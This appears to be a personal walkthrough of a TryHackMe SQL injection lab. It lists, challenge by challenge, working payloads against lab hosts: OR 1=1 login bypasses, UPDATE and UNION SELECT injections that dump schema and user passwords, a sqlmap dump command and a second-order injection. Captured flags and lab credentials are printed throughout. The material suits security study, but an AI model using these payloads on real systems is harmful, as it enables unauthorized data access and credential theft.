# SQL Injection Lab

> VOiD | 28 sept 2021

======================================================

## sql 1

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 Or 1=1 -- - AND password = 'de2b4e0e66a217c99094e8aa0b99c4e047ae0566eb47c58ad0985f5c11aea8da'
```

THM{dccea429d73d4a6b4f117ac64724f460}
======================================================

## sql 2

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' OR 1=1 -- -' AND password = '15883fb49740be91ff641831b65a7d4ec5b7dc242ed581db36a78993df4469b1'
```

THM{356e9de6016b9ac34e02df99a5f755ba}
======================================================

## sql 3

in url
```bash
10.10.133.103:5000/sesqli3/login?profileID=1' OR 1=1 --+&password=a
```

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' OR 1=1 -- 'AND password='ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'
```

THM{645eab5d34f81981f5705de54e8a9c36}
======================================================

## sql 4

in burp 
```bash
profileID=1' OR 1=1 --+&password=as
```

THM{727334fd0f0ea1b836a8d443f09dc8eb}
======================================================

```
The first test confirmed that the application is vulnerable and that we have the correct column names. If we had the wrong column names, then non of the fields would have been updated. Since both fields are updated after injecting the malicious payload, the original SQL statement likely looks something similar to the following code:

UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>

With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:
```
```sql
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='

```
```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='

',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```
## sql5
```sql
sqlite_version()
sqlite 

UPDATE usertable SET nickName='ayush',email=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') --   ',email='TEST',password='ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' WHERE UID='1'

 usertable,secrets

(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets')
CREATE TABLE secrets ( id integer primary key, author integer not null, secret text not null )

(SELECT group_concat(id || "->" || author || ":" || secret || ":") from secrets)

 	1->1:Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer a.:,
 	2->3:Donec viverra consequat quam, ut iaculis mi varius a. Phasellus.:,
 	3->1:Aliquam vestibulum massa justo, in vulputate velit ultrices ac. Donec.:,
 	4->5:Etiam feugiat elit at nisi pellentesque vulputate. Nunc euismod nulla.:,
 	5->6:THM{b3a540515dbd9847c29cffa1bef1edfb}:
```

## sql6
```bash
' OR 1=1 --+
THM{f35f47dcd9d596f0d3860d14cd4c68ec} 
```

## sql7
```sql
' UNION SELECT 1,2-- - 
2 is the entry point

' UNION SELECT 1,sqlite_version()-- - 
' UNION SELECT 1, (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') -- -
users

' UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users') -- - 
CREATE TABLE users ( id integer primary key, username text unique not null, password text not null ) | 

' UNION SELECT 1, (SELECT group_concat(id || "->" || username || ":" || password || ":") from users) -- - '

1->admin:rcLYWHCxeGUsA9tH3GNV:,
2->dev:asd:,
3->amanda:Summer2019!:,
4->maja:345m3io4hj3:,
5->awe32Flage32x:THM{fb381dfee71ef9c31b93625ad540c9fa}:,
6->emil:viking123: | 
```

## sql8
```bash
sqlmap -u http://10.10.185.56:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite -T users --threads 10 --technique=b --dump --batch



THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} 
```


## Sql9 [Vulnerable notes]
```sql
SELECT title, note FROM notes WHERE username = 'as'

'UNION SELECT 1,2; -- +'
username 'UNION SELECT 1,2; -- +' gives vuln

'UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- +'



users,notes

'UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- +'

'  union select 1,group_concat(password) from users'



rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{4644c7e157fd5498e7e4026c89650814},viking123,as,aa,as,as,as

```

## Sql10 [password change]
```bash

create user using the name
admin' -- +
THM{cd5c4f197d708fda06979f13d8081013} 
```

## Sql11 [search book functionality]
```bash

http://10.10.70.166:5000/challenge6/book?title=nsd%27)%20union%20select%201,2,3,4%20--%20+

http://10.10.70.166:5000/challenge6/book?title=nsd%27)%20UNION%20SELECT%201,2,3,group_concat(tbl_name)%20from%20sqlite_master%20where%20type=%27table%27%20and%20tbl_name%20not%20like%20%27sqlite_%%27%20--%20+

10.10.70.166:5000/challenge6/book?title=nsd') union select 1,2,3,group_concat(password) from users -- +

THM{27f8f7ce3c05ca8d6553bc5948a89210}

```


## Sql 12 [book title 2]
```

.eJyrVkrOSMzJSc1LTzWNLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFNCkjVDaDLDEIZpKkbWYY5dhzmajloAfOM2FA.YiWStw.acaXZQa7CNqJzIozHYqZ2Q81gdo
```